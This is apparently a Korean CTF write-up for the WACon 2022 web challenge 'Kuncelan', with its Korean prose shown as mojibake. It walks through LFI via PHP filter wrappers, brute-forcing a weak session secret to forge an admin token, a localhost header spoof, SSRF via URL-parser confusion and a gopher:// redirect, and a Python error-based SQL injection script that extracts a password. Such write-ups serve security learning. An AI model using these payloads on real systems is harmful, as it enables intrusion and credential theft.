---
title: "[WACon 2022] KuncÉ›lan"
date: 2022-07-01 05:46:00 +09:00
categories: [Writeup, CTF]
tags: [Writeup]
author: aestera
---


# KuncÉ›lan
â€‹

![Untitled](/assets/img/post_images/WaCon/3.png)

ë¬¸ì œ ì‚¬ì´íŠ¸ì— ì ‘ì†í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë¡œê·¸ì¸ ì°½ì„ ë³¼ ìˆ˜ ìˆë‹¤.

guest/guest ë¡œ ë¡œê·¸ì¸ í•´ ë³´ë©´ ì•„ë˜ ì‚¬ì§„ê³¼ ê°™ì€ í˜ì´ì§€ê°€ ë³´ì¸ë‹¤.
â€‹<br><br><br>

![Untitled](/assets/img/post_images/WaCon/3.png)
â€‹
Welcome **guest** ğŸ‘‹ê°€ ì¶œë ¥ë˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì•„ guest ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ì´ ëœ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. Fun? ë©”ë‰´ì— ë“¤ì–´ê°€ ë³´ë©´
<br><br>

![Untitled](/assets/img/post_images/WaCon/4.png)
â€‹
URLì„ ì…ë ¥í•  ìˆ˜ ìˆëŠ” ì°½ì´ ë‚˜ì˜¨ë‹¤. SSRF ì¼ ê²ƒì´ë¼ ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤. 
â€‹
ê·¸ëŸ¬ë‚˜ ìš”ì²­ì„ ë³´ë‚´ë©´ <br>
**Only the administrator can test this function from 127.0.0.1!** ë¼ëŠ” ë¬¸êµ¬ë§Œ ì¶œë ¥ëœë‹¤. 
â€‹<br>
adminê³„ì •ìœ¼ë¡œë§Œ Request ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.
â€‹<br><br>
![Untitled](/assets/img/post_images/WaCon/5.png)
â€‹
ë¡œê·¸ì¸ì°½ SQL Injection ë“± ì—¬ëŸ¬ê°€ì§€ ì‹œë„ë¥¼ í•´ë³´ë©´ì„œ ëª‡ê°€ì§€ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¶€ë¶„ë“¤ì„ ë°œê²¬í–ˆë‹¤.

#### **1\. load**â€‹
**Fun?ì˜ ê²½ë¡œì¸ http://114.203.209.112:8000/index.phtml?fun\_004ded7246=loadë¥¼ ë³´ë©´
loadë¼ëŠ” íŒŒë¼ë¯¸í„°ê°€ ì¡´ì¬í•˜ê³  íŒŒë¼ë¯¸í„° ê²½ë¡œë¡œ ì´ë™ë˜ì–´ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆì—ˆë‹¤.
â€‹LFIë¥¼ ì‹œë„í•´ ë³¼ ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.**  

#### **2\. Cookie** 
â€‹**Fun? ìœ¼ë¡œ ì´ë™í•˜ë©´ USERì™€ X-TOKEN ì´ë¼ëŠ” ì´ë¦„ì˜ ì¿ í‚¤ë¥¼ ë°˜í™˜í•´ì¤€ë‹¤.**  
``` 
USER : guest
X-TOKEN : fe7aa0039d22374a01b95ed9bce735c265aeede557fa37b0d36f6d90a45cdb92
```

****

## **1. LFI**
â€‹
ê°€ì¥ ë¨¼ì € USERì˜ ê°’ì„ guestì—ì„œ adminìœ¼ë¡œ ë°”ê¿”ì„œ ì ‘ê·¼í•´ ë´¤ëŠ”ë° ë‹¹ì—°íˆ ê·¸ë ‡ê²Œ ê°„ë‹¨í•œ ë¬¸ì œëŠ” ì•„ë‹ˆì—ˆë‹¤. <br>
â€‹
USER ì˜ ê°’ì„ ë³€ê²½í•´ë„ ë³€í™”ê°€ ì—†ê³  X-TOKENì´ ì–´ë–¤ ì—­í• ì„ í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ì—†ì—ˆë‹¤.
â€‹
ë•Œë¬¸ì— LFIë¥¼ ì‹œë„í•´ ë³´ì•˜ë‹¤. 
â€‹
/etc/passwd ë¥¼ ì‹œë„í•´ ë³´ì•˜ì§€ë§Œ ì†Œë“ì´ ì—†ì—ˆê³  PHPë¼ëŠ” ì ì„ ìƒê°í•´ PHP Wrapperë¥¼ ì‚¬ìš©í•´  LFIë¥¼ ì‹œë„í–ˆë‹¤. 
â€‹
![Untitled](/assets/img/post_images/WaCon/6.png)
â€‹
ì´ë ‡ê²Œ base64ë¡œ encodeëœ í˜ì´ì§€ ì†ŒìŠ¤ì½”ë“œê°€ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. 
â€‹
ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ê³  ë‚˜ì„œì•¼ ì•ˆ ì‚¬ì‹¤ì´ì§€ë§Œ íŒŒë¼ë¯¸í„° ê°’ ë’¤ì— .phtml í™•ì¥ìë¥¼ ë¶™ì—¬ì„œ  php://filter/convert.base64encode/resource=index.phtml ì²˜ëŸ¼ í™•ì¥ìë¥¼ ë¶™ì¸ ìƒíƒœë¡œ ì‹œë„í•˜ë©´ ì†ŒìŠ¤ì½”ë“œë¥¼ ì–»ì„ ìˆ˜ ì—†ë‹¤.
(ì´ê²ƒ ë•Œë¬¸ì— LFIë¥¼ í¬ê¸°í–ˆì—ˆë‹¤...)
â€‹<br>â€‹<br>
index.phtmlì˜ ì½”ë“œë¥¼ decode í•´ë³´ë©´
â€‹
``` php
//index.phtml
â€‹
<?php
error_reporting(0);
session_start();
â€‹
if(!isset($_SESSION['username'])) {
    header('location: ./login.php');
    die();
}
?>
â€‹
â€‹
<!doctype html>
<html lang="en">
// ---ìƒëµ---
    <?php 
    if (isset($_GET["fun_004ded7246"])) {
      if($_GET["fun_004ded7246"] !== ""){include $_GET["fun_004ded7246"].".phtml";}
      else {
      ?>
                      <main role="main" class="container">
                      <h1 class="mt-5">They said ?</h1>
                      <p class="lead">A secure website should start with <code>https</code> rather than <code>http</code>. The "s" in "https" stands for "secure". </p>
                      </main>
      <?php
      }
    }
    else{
      header('location: ./index.phtml?fun_004ded7246');
      die();
    }
    ?>
// ---ìƒëµ---
  </body>
</html>
```
â€‹
include ë¥¼ í•´ì£¼ëŠ” ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ <br>
**$\_GET\["fun\_004ded7246"\].".phtml"** 
â€‹<br>
ì´ë ‡ê²Œ í™•ì¥ìë¥¼ ë¶™ì—¬ì£¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.
â€‹â€‹<br>â€‹<br>
load.phtmlì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ ë³´ë©´ 
â€‹
![Untitled](/assets/img/post_images/WaCon/7.png)
â€‹
```php
//load.phtml
â€‹
<?php
â€‹
// LOCATION : ./internal_e0134cd5a917.php
â€‹
error_reporting(0);
session_start();
â€‹
if (!isset($_SESSION['username']))
{
    header('location: ./login.php');
    die();
}
â€‹
if (__FILE__ === $_SERVER['SCRIPT_FILENAME'])
{
    die("only in include");
}
â€‹
function valid_url($url)
{
    $valid = False;
    $res=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$res) $valid = True;
    try{ parse_url($url); }
    catch(Exception $e){ $valid = True;}
    $int_ip=ip2long(gethostbyname(parse_url($url)['host']));
    return $valid 
            || ip2long('127.0.0.0') >> 24 == $int_ip >> 24 
            || ip2long('10.0.0.0') >> 24 == $int_ip >> 24 
            || ip2long('172.16.0.0') >> 20 == $int_ip >> 20 
            || ip2long('192.168.0.0') >> 16 == $int_ip >> 16 
            || ip2long('0.0.0.0') >> 24 == $int_ip >> 24;
}
â€‹
function get_data($url)
{
â€‹
    if (valid_url($url) === True) { return "IP not allowed or host error"; }
â€‹
    $ch = curl_init();
    $timeout = 7;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = curl_exec($ch);
â€‹
    if (curl_error($ch))
    {
        curl_close($ch);
        return "Error !";
    }
â€‹
    curl_close($ch);
    return $data;
}
â€‹
function gen($user){
    return substr(sha1((string)rand(0,getrandmax())),0,20);
}
â€‹
if(!isset($_SESSION['X-SECRET'])){ $_SESSION["X-SECRET"] = gen(); }
if(!isset($_COOKIE['USER'])){ setcookie("USER",$_SESSION['username']); }
if(!isset($_COOKIE['X-TOKEN'])){ setcookie("X-TOKEN",hash("sha256", $_SESSION['X-SECRET']."guest")); }
â€‹
$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);
â€‹
$out = "";
â€‹
if (isset($_POST['url']) && !empty($_POST['url']))
{
    if ( 
        $IP === "127.0.0.1" 
        & $_COOKIE['X-TOKEN'] === hash("sha256", $_SESSION['X-SECRET'].$_COOKIE['USER']) 
        & strpos($_COOKIE['USER'], 'admin') !== false 
    )
    {
        $out = get_data($_POST['url']);
    }
    else
    {
        $out = "Only the administrator can test this function from 127.0.0.1!";
    }
â€‹
}
â€‹
?>
â€‹
<main role="main" class="container">
<h1 class="mt-5">ğ–ˆğ–šğ–—ğ–‘:// ?</h1>
<p class="lead">cURL is powered by libcurl , used to interact with websites ğŸŒ</p>
<form method="post" >
<legend><label for="url">Website URL</label></legend>
<input class="form-control" type="url" name="url" style="width:100%" />
<input class="form-control" type="submit" value="ğŸ‘‰ Request HTTP ğŸ‘ˆ">
</form><?php echo $out; ?> 
</main>
```
â€‹
ì½”ë“œ ìƒë‹¨ì— ./internal\_e0134cd5a917.phpë¼ëŠ” ê²½ë¡œì— FLAG ê°€ ì¡´ì¬í•  ê²ƒì´ë¼ê³  ì˜ˆìƒí•  ìˆ˜ ìˆë‹¤. 
â€‹
í•˜ì§€ë§Œ ì‹¤ì œë¡œ ì € ê²½ë¡œë¡œ ì ‘ì†í•´ ë³´ë©´ localhostì˜ ì ‘ì†ë§Œì„ í—ˆìš©í•œë‹¤ëŠ” ë¬¸êµ¬ê°€ ëœ¬ë‹¤.
â€‹
![Untitled](/assets/img/post_images/WaCon/8.png)
â€‹
<br><br>

****

## **2. Hash Bruteforce**
â€‹
ì¼ë‹¨ admin ê²€ì¦ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ loadí˜ì´ì§€ ì†ŒìŠ¤ì½”ë“œë¥¼ í•´ì„í•´ ë³´ì•˜ë‹¤. 
â€‹
```php
function gen($user){
    return substr(sha1((string)rand(0,getrandmax())),0,20);
}
â€‹
if(!isset($_SESSION['X-SECRET'])){ $_SESSION["X-SECRET"] = gen(); }
if(!isset($_COOKIE['USER'])){ setcookie("USER",$_SESSION['username']); }
if(!isset($_COOKIE['X-TOKEN'])){ setcookie("X-TOKEN",hash("sha256", $_SESSION['X-SECRET']."guest")); }
â€‹
$IP = (isset($_SERVER['HTTP_X_HTTP_HOST_OVERRIDE']) ? $_SERVER['HTTP_X_HTTP_HOST_OVERRIDE'] : $_SERVER['REMOTE_ADDR']);
â€‹
$out = "";
â€‹
if (isset($_POST['url']) && !empty($_POST['url']))
{
    if ( 
        $IP === "127.0.0.1" 
        & $_COOKIE['X-TOKEN'] === hash("sha256", $_SESSION['X-SECRET'].$_COOKIE['USER']) 
        & strpos($_COOKIE['USER'], 'admin') !== false 
    )
    {
        $out = get_data($_POST['url']);
    }
    else
    {
        $out = "Only the administrator can test this function from 127.0.0.1!";
    }
â€‹
}
```

ì½”ë“œë¥¼ í•´ì„í•´ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¥¼ í™•ì¸ í•  ìˆ˜ ìˆë‹¤. <br><br>
â€‹
**1\.** $\_SESSION\['X-SECRET'\]ì˜ ê°’ì´ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ gen() ì„ í˜¸ì¶œí•´ ê°’ì„ ì„¤ì •í•œë‹¤. <br><br>
â€‹
**2\.** $\_COOKIE\['USER'\]ì˜ ê°’ì´ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ $\_SESSION\['username'\] ê°’ì„ ê°€ì ¸ì™€ USERì˜ ê°’ìœ¼ë¡œ ì„¤ì •í•œë‹¤.<br><br>
â€‹
**3\.** $\_COOKIE\['X-TOKEN'\]ì˜ ê°’ì´ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ $\_SESSION\['X-SECRET'\]ì™€ "guest"ë¥¼ ì´ì–´ë¶™ì—¬ sha256ë¡œ í•´ì‹±í•œ ê°’ì„ X-TOKENê°’ìœ¼ë¡œ ì„¤ì •í•œë‹¤.<br><br>
â€‹
**4\.** $\_SERVER\['HTTP\_X\_HTTP\_HOST\_OVERRIDE'\]ì˜ ê°’ì´ ì¡´ì¬í•˜ë©´ í•´ë‹¹ ê°’ì„, ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šìœ¼ë©´
â€‹$\_SERVER\['REMOTE\_ADDR'\] ì˜ ê°’ì„ Headerì˜ ê°’ìœ¼ë¡œ ì„¤ì •í•œë‹¤.<br>
ì—¬ê¸°ì„œ $\_SERVER\['HTTP\_X\_HTTP\_HOST\_OVERRIDE'\]ì˜ Header ê°’ì€ X-HTTP-HOST-OVERRIDE ê°€ ëœë‹¤.<br>
â€‹(ë³´í†µ custom Headerì˜ ê²½ìš° HTTPë¥¼ ì§€ìš°ê³  '\_' ë¥¼ '-' ë¡œ ë°”ê¾¸ë©´ ëœë‹¤!)
â€‹<br><br>
ê°€ì¥ ë¨¼ì € ì•Œì•„ë‚´ì•¼ í•  ê²ƒì€ X-SECRETì˜ ê°’ì´ë‹¤. ì´ ê°’ì€ sessionê°’ì´ê³  session destoryë¥¼ í•´ì£¼ì§€ ì•ŠëŠ” í•œ <br>í•­ìƒ ê°™ì€ ê°’ìœ¼ë¡œ ìœ ì§€ëœë‹¤. ë‹¨ê³„ 3ì—ì„œ X-TOKENì˜ ê°’ì€ COOKIEê°’ì´ê¸° ë•Œë¬¸ì— ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ<br> Brute Forcingí•˜ì—¬ X-SECRET ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ ìˆë‹¤. 
â€‹
```php
<?php
function breakHash(){
    $target = "c857a2119fdc6d47cafe8946d0f71e5a56ef18bbd5e6ffe2804386475fe50ba4";
    for($i = 96415042; $i <= getrandmax(); $i++){
        $X_SECRET = substr(sha1((string)$i),0,20);
        if($target === hash("sha256",$X_SECRET."guest"))
            return $X_SECRET;
        else 
            echo "try [".$i."]\n";
    }
}
â€‹
$X_SECRET = breakHash();
echo "[+] X-SECTERT : ".$X_SECRET."\n";                      
echo "[+] X-TOKEN(admin) : ". hash("sha256", $X_SECRET."admin")."\n"; 
?>
â€‹
/*
try [1]
.
.
.
try [96415042]
[+] X-SECTERT : 3c435a3686a22fd5c2bc
[+] X-TOKEN(admin) : e1a7dbb2624b0edc01f4bdf0d3d5e3e411ba0cd24a691509e2658d1435c2ff10
*/
```
â€‹
ìœ„ ì½”ë“œë¡œ brute forcing í•´ì„œ X-SECRETì˜ ê°’ê³¼ ì´í›„ admin ê²€ì¦ì„ ìœ„í•´ X-SECRETê³¼ "admin"ë¬¸ìì—´ì„ ë¶™ì—¬
<br>
sha256ìœ¼ë¡œ í•´ì‹±í•œ X-TOKEN ê°’ë„ í•œë²ˆì— ì¶œë ¥í–ˆë‹¤. getrandmax() = (2 ^ 31) - 1 ë¼ ìƒê°ë³´ë‹¤ ì˜¤ë˜ ê±¸ë ¤ 
<br>
$i ê°’ì´ 0ë¶€í„° ì‹œì‘í•˜ëŠ” ì½”ë“œì™€ getrandmax()ë¶€í„° ì‹œì‘í•˜ëŠ” ì½”ë“œ ë‘ê°œë¥¼ ë™ì‹œì— ëŒë ¸ë‹¤.

<br><br>

```
X-HTTP-HOST-OVERRIDE: 127.0.0.1
USER= admin
X-TOKEN = e1a7dbb2624b0edc01f4bdf0d3d5e3e411ba0cd24a691509e2658d1435c2ff10
```
â€‹
![Untitled](/assets/img/post_images/WaCon/9.png)
â€‹
ê°’ì„ ë°”ê¾¸ì–´ ìš”ì²­ì„ ë³´ë‚´ admin ê²€ì¦ì„ ìš°íšŒí–ˆë‹¤. 
â€‹
IP not allowed or host error ë¼ê³  ìƒˆë¡œìš´ ë¬¸êµ¬ê°€ ì¶œë ¥ëœë‹¤.
â€‹<br><br>

****

## **3. SSRF**
â€‹
cURL ìš”ì²­ì„ ë³´ë‚´ê¸° ì „ì—  valid\_url í•¨ìˆ˜ì—ì„œ URLì„ ê²€ì¦í•œë‹¤.

```php
function valid_url($url)
{
    $valid = False;
    $res=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$res) $valid = True;
    try{ parse_url($url); }
    catch(Exception $e){ $valid = True;}
    $int_ip=ip2long(gethostbyname(parse_url($url)['host']));
    return $valid 
            || ip2long('127.0.0.0') >> 24 == $int_ip >> 24 
            || ip2long('10.0.0.0') >> 24 == $int_ip >> 24 
            || ip2long('172.16.0.0') >> 20 == $int_ip >> 20 
            || ip2long('192.168.0.0') >> 16 == $int_ip >> 16 
            || ip2long('0.0.0.0') >> 24 == $int_ip >> 24;
}
â€‹
function get_data($url)
{
â€‹
    if (valid_url($url) === True) { return "IP not allowed or host error"; }
â€‹
    $ch = curl_init();
    $timeout = 7;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = curl_exec($ch);
â€‹
    if (curl_error($ch))
    {
        curl_close($ch);
        return "Error !";
    }
â€‹
    curl_close($ch);
    return $data;
}
```
â€‹
URLê²€ì¦ì„ ìš°íšŒí•˜ê¸° ìœ„í•œ ë°©ë²•ì€ ë‘ ê°€ì§€ë¡œ ë³´ì¸ë‹¤. <br>
**1\.** parse\_url ê³¼ cURL ìš”ì²­ì˜ Host ì¸ì‹ì°¨ì´
â€‹<br>
**2\.** cURLìš”ì²­ setoptì˜ redirection
<br><br>
ë¨¼ì € 1ë²ˆ ë°©ë²•ì„ ì‚´í´ë³´ì<br>

[BlackHat](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf "BlackHat") ë°œí‘œì˜ 34pageë¥¼ ë”°ë¥´ë©´ ë‹¤ìŒ URLì—ì„œ 
â€‹
```
http://aaa@evil.com:80@google.com
```
â€‹
cURLì€ evil.com:80 ë¶€ë¶„ì„, parse\_urlì€ google.comë¶€ë¶„ì„ Hostë¡œ ì¸ì‹í•œë‹¤.<br>
2ë²ˆ ë°©ë²•ì„ ìœ„í•´  cURL ìš”ì²­ setopt ì¤‘ ë‘ê°€ì§€ë¥¼ ë³´ë©´ FOLLOWLOCATION, ì¦‰, Redirectionì„ í•œë²ˆ í—ˆìš©í•œë‹¤. 
â€‹
```
curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
```
â€‹<br><br>
ë”°ë¼ì„œ ì ‘ì† ê°€ëŠ¥í•œ ì„œë²„ë¥¼ ë§Œë“¤ì–´ë†“ê³ , ê·¸ ì„œë²„ì—ì„œ íŒŒì¼ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜í•˜ë„ë¡ ì„¤ì •í•˜ê±°ë‚˜
â€‹
PHP Response Headerì— Locationì„ ë‹¤ìŒê³¼ ê°™ì´ ì½”ë“œ ì‘ì„±í•˜ì—¬ Redirect ì‹œí‚¬ ìˆ˜ ìˆë‹¤.
â€‹
```php
<?php header("Location: http://127.0.0.1/internal_e0134cd5a917.php"); ?>
```
â€‹<br>
ì¡°ê¸ˆ ë” ì‰¬ì›Œë³´ì´ëŠ” ì²«ë²ˆì§¸ ë°©ë²•ìœ¼ë¡œ requestë¥¼ ë³´ë‚´ë³´ë©´

![Untitled](/assets/img/post_images/WaCon/10.png)

ë‹¤ìŒ FLAG ì£¼ì†Œì¸ ./internal\_1d607d2c193b.php ê°€ ì¶œë ¥ëœë‹¤. í•´ë‹¹ ê²½ë¡œë¡œ ì ‘ì†í•´ ë³´ë©´

â€‹<br>â€‹
![Untitled](/assets/img/post_images/WaCon/11.png)
POST EMPTY! ê°€ ì¶œë ¥ëœë‹¤. ë”°ë¼ì„œ POSTë¡œ ë‹¤ì‹œ ìš”ì²­ì„ ë³´ë‚´ë´¤ë‹¤. 
â€‹
â€‹<br>â€‹<br>
![Untitled](/assets/img/post_images/WaCon/12.png)
Authorization: Basic Headerë¥¼ ë„£ì–´ì¤˜ì•¼ í•˜ëŠ”ê²ƒ ê°™ë‹¤ .
â€‹
![Untitled](/assets/img/post_images/WaCon/13.png)
Authorization: Basicì— ëŒ€í•´ ê²€ìƒ‰í•´ ë³´ë‹ˆ admin:admin ì„ Base64 ì¸ì½”ë”©í•´ ë³´ë‚´ë©´ ë  ê²ƒ ê°™ë‹¤. 
â€‹
â€‹<br>â€‹<br>â€‹<br>

****

## **4. Error Based SQL Injection**
â€‹
![Untitled](/assets/img/post_images/WaCon/14.png)

POSTë¡œ ìš”ì²­ì„ ë³´ë‚¼ ë•ŒëŠ” Content-Type: application/x-www-form-urlencoded ê°™ì´ Content-Typeë¥¼ í—¤ë”ì— ë„£ì–´ì„œ ë³´ë‚´ì•¼ í•˜ëŠ” ê²ƒ ê°™ë‹¤. ì—¬ê¸°ì„œ ê½¤ ì˜¤ëœ ì‹œê°„ ì‚½ì§ˆí–ˆë‹¤.. \(HTTP Headerì— ëŒ€í•œ ê³µë¶€ê°€ ë” í•„ìš”í•´ ë³´ì¸ë‹¤.\)
â€‹â€‹<br>â€‹<br>ì•„ë¬´íŠ¼ ì´ë²ˆì—” SQL : user not found ê°€ ì¶œë ¥ëœë‹¤. SQL Injectionì„ í†µí•´ IDì™€ PWë¥¼ ì•Œì•„ë‚´ê³  Authorization: Basic ìœ¼ë¡œ ë³´ë‚´ì£¼ë©´ í•´ê²°í•  ìˆ˜ ìˆì„ ê²ƒ ê°™ë‹¤. SQL Injectionì„ í™•ì¸í•´ ë³´ê¸° ìœ„í•´ **'**ë¥¼ ë„£ì–´  admin':adminì„ ë³´ë‚´ë³´ì•˜ë‹¤. 
â€‹â€‹<br>â€‹<br>

![Untitled](/assets/img/post_images/WaCon/15.png)
â€‹
SQLì˜ ì—ëŸ¬ê°€ ì¶œë ¥ëœë‹¤. SQL Injectionì„ í†µí•´ adminì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚´ì•¼ í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.
â€‹
ì•„ë˜ì˜ payloadë¥¼ base64ë¡œ encode í•˜ì—¬ ìš”ì²­ì„ ë³´ë‚´ë³´ë‹ˆ
â€‹â€‹â€‹<br>â€‹<br>
```sql
admin'union select 1,2,table_name from information_schema.tables#:admin
```
â€‹
![Untitled](/assets/img/post_images/WaCon/16.png)
â€‹
from localhost only ! ë¼ê³  ì¶œë ¥ëœë‹¤. ë¡œê·¸ì¸ì— ì„±ê³µí•œ ê²ƒìœ¼ë¡œ ë³´ì´ì§€ë§Œ columnì˜ ê°œìˆ˜ê°€ 3ê°œ ë¼ëŠ” ê²ƒ ë§Œ ì•Œ ìˆ˜ ìˆì„ ë¿ adminì˜ passwordëŠ” ì•Œ ìˆ˜ ì—†ë‹¤. ë”°ë¼ì„œ Error Based SQL Injectionì´ ì¢‹ì•„ ë³´ì¸ë‹¤.
â€‹â€‹â€‹â€‹<br>â€‹<br>
[Error Based SQL Injection](https://hyunmini.tistory.com/17)  â† ì´ ë¸”ë¡œê·¸ë¥¼ ì°¸ì¡°í•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•´ ë³´ì•˜ë‹¤. 
â€‹
```python
import requests, base64
â€‹
URL = "http://114.203.209.112:8000/internal_1d607d2c193b.php"
â€‹
for i in range(62):
    data = {'hi':'hi'}
    payload = "admin' union (select 1,count(*),concat((select table_name from information_schema.tables limit "+str(i)+",1),'$',floor(rand(0)*2))as b from information_schema.tables group by b)#:admin"
    encoded = (base64.b64encode(payload.encode('ascii')))
    encoded_payload = encoded.decode('ascii')
    headers = {"Content-Type": "application/x-www-form-urlencoded",'Authorization': "Basic "+encoded_payload}
    res = requests.post(URL, data=data, headers=headers)
â€‹
    print(res.text[115:150])
â€‹
â€‹
"""
--ìƒëµ--
'INNODB_SYS_TABLESPACES$1' for key 
'INNODB_METRICS$1' for key '<group_
'INNODB_SYS_FOREIGN_COLS$1' for key
'INNODB_CMPMEM$1' for key '<group_k
'INNODB_BUFFER_POOL_STATS$1' for ke
'INNODB_SYS_COLUMNS$1' for key '<gr
'INNODB_SYS_FOREIGN$1' for key '<gr
'INNODB_SYS_TABLESTATS$1' for key '
'auth_user$1' for key '<group_key>'
â€‹
 """
```
â€‹
tableë“¤ì„ ì­‰ ë½‘ì•„ë³´ë‹ˆ auth\_userë¼ëŠ” êµ‰ì¥íˆ ìˆ˜ìƒí•œ tableì´ ë³´ì¸ë‹¤.<br>ì°¸ê³ ë¡œ tableì´ë¦„ ë’¤ì˜ $ì™€ 1ì€ '$',floor(rand(0)\*2)ë¥¼ table\_nameê³¼ concat() í•´ì¤˜ì„œ ê·¸ë ‡ë‹¤. ì´ì œ auth\_user ì˜ columnê³¼ admin passwordë¥¼ ë½‘ì•„ë‚¼ ì°¨ë¡€ë‹¤.
â€‹
``` python
# Columns
payload = "admin' union (select 1,count(*),concat((select column_name from information_schema.columns where table_name='auth_user' limit "+str(i)+",1),'$',floor(rand(0)*2))as b from information_schema.tables group by b)#:admin"
â€‹
id
login 
password
â€‹
=======================================================================================================================================================================================================================================
â€‹
# password
payload = "admin' union (select 1,count(*),concat((select password from auth_user where login='admin' limit "+str(i)+",1),'$',floor(rand(0)*2))as b from information_schema.tables group by b)#:admin"
â€‹
Error message : Duplicate entry 'WACon{Try_using_Gophhhher$1' for key '<group_key>'
```
â€‹
**WACon{Try\_using\_Gophhhher**<br><br>
â€‹
FLAGì˜ ë°˜ì„ íšë“í–ˆë‹¤! ë‚˜ë¨¸ì§€ ë°˜ì„ ì–»ì–´ë³´ì. Gopherë¼ëŠ” íŒíŠ¸ë¥¼ ì£¼ëŠ” ê²ƒì„ ë³´ë‹ˆ ë‚˜ë¨¸ì§€ ë°˜ì€ Gopher protocolì„ ì´ìš©í•œ SSRFë¡œ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒ ê°™ë‹¤. 
â€‹<br><br><br>

****

## **5. SSRF using gopher protocol**
â€‹**3. SSRF** ë¡œ ëŒì•„ê°€ ìƒê°í•´ ë³´ë©´ SSRFë¥¼ ìœ„í•´ í•„ìš”í•œ ì¡°ê±´ì´ ë‘ê°€ì§€ ìˆë‹¤.<br><br>
**1\. Authorization: Basic Header**<br>
â€‹**2\. POST**
â€‹<br><br>
[gopher SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) ë¥¼ ì°¸ê³ í•˜ì—¬ ë‘ ì¡°ê±´ì„ ëª¨ë‘ ë§Œì¡±í•  ìˆ˜ ìˆë„ë¡ ì•„ë˜ PHP íŒŒì¼ì— ì ‘ê·¼ í•˜ë„ë¡ í–ˆë‹¤.
â€‹
```php
<?php 
header("Location: gopher://127.0.0.1:80/_POST%20/internal_1d607d2c193b.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AAccept:%20application/gopher%0D%0AAuthorization:%20Basic YWRtaW46V0FDb257VHJ5X3VzaW5nX0dvcGhoaGhlcg==%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%205%0D%0A%0D%0Ahi=hi"); 
?>
```
â€‹
![Untitled](/assets/img/post_images/WaCon/17.png)
â€‹
FLAGì˜ ë‚˜ë¨¸ì§€ ë°˜ì ˆ **\_ffabcdbc}** ë¥¼ ì–»ì—ˆë‹¤.
â€‹<br><br>

**FLAG : WACon{Try\_using\_Gophhhher\_ffabcdbc}**
===